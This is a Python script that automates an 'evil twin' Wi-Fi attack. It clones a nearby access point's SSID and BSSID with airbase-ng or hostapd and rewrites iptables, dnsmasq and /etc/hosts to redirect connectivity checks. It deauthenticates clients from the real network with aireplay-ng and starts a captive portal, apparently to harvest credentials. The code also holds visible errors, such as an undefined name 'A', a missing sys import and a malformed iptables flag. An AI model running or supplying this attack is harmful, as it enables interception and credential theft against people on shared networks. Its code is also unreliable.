# -*- encoding: utf-8 -*-
"""
Autor: alexfrancow
"""

import os
import time
import subprocess

header = """

"""
print(header)

try:
    script_path = os.path.dirname(os.path.realpath(__file__))
    script_path = script_path + "/"

    #UPDATING
    update = input("[?] Install/Update dependencies? Y/n: ")
    update = update.lower()
    if update == "y" or update == "":
        print("[I] Checking/Installing dependencies, please wait...")
        os.system("sudo apt-get update")
        os.system("sudo apt-get install hostapd -y")
        os.system("sudo apt-get install aircrack-ng -y")
        os.system("sudo apt-get install dnsmasq -y")
        os.system("sudo apt-get install isc-dhcp-server -y")
        os.system("sudo apt-get install python3-venv -y")
        os.system("sudo apt-get install git -y")

    try:
        os.system("pkill airbase-ng")
        os.system("pkill dnsmasq")
    except:
        pass

    ap_iface = input("[?] Please enter the name of your wireless interface (for the AP): ")
    net_iface = input("[?] Please enter the name of your internet connected interface: ")

    #MONITOR MODE
    print("[I] Setting " + ap_iface + " in mode monitor")
    os.system("ifconfig " + ap_iface + " down")
    os.system("iwconfig " + ap_iface + " mode monitor")
    time.sleep(1)

    #AIRCRACK CONFIG
    print("[I] Selecting AP to clone..")
    #5G
    #os.system("airodump-ng " + ap_iface + " --band a")
    #2.4G
    os.system("airodump-ng " + ap_iface + " --band abg")

    ssid = input("[?] Please enter the SSID for the AP: ")
    bssid = input("[?] Please enter the BSSID for the AP: ")
    while True:
        channel = input("[?] Please enter the channel for the AP: ")
        if channel.isdigit():
            break
        else:
            print("[!] Please enter a channel number.")


    fakeap = input("[?] Airbase-ng or hostapd? (A/h)")
    if A in fakeap:
        print("[I] Starting Fake AP with airbase-ng...")
        #subprocess.Popen(["airbase-ng", "-e", ssid, "-a", bssid, "-c", channel, ap_iface])
        subprocess.Popen(["airbase-ng", "-a", bssid, "-e", ssid, "-c", channel, ap_iface])
        print("[I] Configuring IP on at0")
        time.sleep(3)
        os.system("ifconfig at0 10.0.0.1 netmask 255.255.255.0")
    else:
        print("[I] Starting Fake AP with hostapd...")
        os.system("hostapd -dd hostapd.conf")
        print("[I] Configuring IP on at0")
        time.sleep(3)
        os.system("ifconfig at0 10.0.0.1 netmask 255.255.255.0")

    #IPTABLES
    os.system("route add -net 10.0.0.0 netmask 255.255.255.0 gw 10.0.0.1")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -F")
    os.system("iptables -t nat -F")

    os.system("iptables -N internet -t mangle")
    os.system("iptables -t mangle -A PREROUTING -j internet")

    os.system("iptables -A FORWARD -i at0 -p tcp --dport 443 -j DROP")
    os.system("iptables -A FORWARD -i wlan1 -p tcp --dport 443 -j DROP")
    os.system("iptables -A FORWARD -i wlan0 -p tcp --dport 443 -j DROP")

    os.system("iptables -A INPUT -j LOG -log--level 4")
    os.system("iptables -A INPUT DROP")

    os.system("iptables -t nat -D POSTROUTING 1")
    os.system("iptables -P FORWARD ACCEPT")
    os.system("iptables -t nat -A POSTROUTING -o " + net_iface  + " -j MASQUERADE")
    os.system("iptables --append FORWARD -j ACCEPT --in-interface at0")

    os.system("iptables -A FORWARD -i wlan0 -p tcp --dport 22 -d 192.168.1.111 -j ACCEPT")
    os.system("iptables -t nat -A PREROUTING -i at0 -d 0/0 -p tcp --dport 80 -j DNAT --to-destination 10.0.0.1:80")
    os.system("iptables -A FORWARD -i wlan1 -j DROP")

    #DHCP CONFIG
    dns_config = "listen-address=127.0.0.1\ninterface=at0\ndomain-needed\nbogus-priv\nno-resolv\nserver=8.8.8.8\nserver=8.8.4.4\ncache-size=4096\nlocal=/home/\nexpand-hosts\ndomain=home\ndhcp-range=10.0.0.2,10.0.0.99,255.255.255.0,14d\ndhcp-option=option:router,10.0.0.1\ndhcp-option=252"
    print("[I] Backing up /etc/dnsmasq.conf...")
    os.system("sudo cp /etc/dnsmasq.conf /etc/dnsmasq.conf.backup")
    print("[I] Deleting old config file...")
    os.system("sudo rm /etc/dnsmasq.conf > /dev/null 2>&1")
    print("[I] Writing new config file...")
    os.system("sudo echo -e '" + dns_config + "' > /etc/dnsmasq.conf")

    #DNS CONFIG
    
    hosts_config = "127.0.0.1	localhost\n10.0.0.1    connectivitycheck.android.com\n10.0.0.1    connectivitycheck.gstatic.com\n10.0.0.1    clients1.google.com\n10.0.0.1	clients3.google.com\n10.0.0.1	clients.l.google.com\n10.0.0.1    captive.apple.com\n"
    print("[I] Backing up /etc/hosts...")
    os.system("sudo cp /etc/hosts /etc/hosts.backup")
    print("[I] Deleting old config file...")
    os.system("sudo rm /etc/hosts > /dev/null 2>&1")
    print("[I] Writing new config file...")
    os.system("sudo echo -e '" + hosts_config + "' > /etc/hosts")

    #DNSMASQ
    try:
        print("[I] Starting dnsmasq")
        os.system("dnsmasq -C /etc/dnsmasq.conf -d &")
    except:
        print("Error starting dnsmasq")
        sys.exit()

    
    #DEAUTH
    print("[I] Bumping the neighbor Off...")
    subprocess.Popen(["aireplay-ng", "-0", "1", "-a", bssid, ap_iface ])
    

    #CP
    print("[I] Starting captive portal")
    os.system("python run.py")

    try:
        while True:
            time.sleep(10)
    except KeyboardInterrupt:
        print("[!] Stopping... ")
        os.system("pkill airbase-ng")
        os.system("pkill dnsmasq")

except KeyboardInterrupt:
        print("[!] Stopping... ")
        os.system("pkill airbase-ng")
        os.system("pkill dnsmasq")
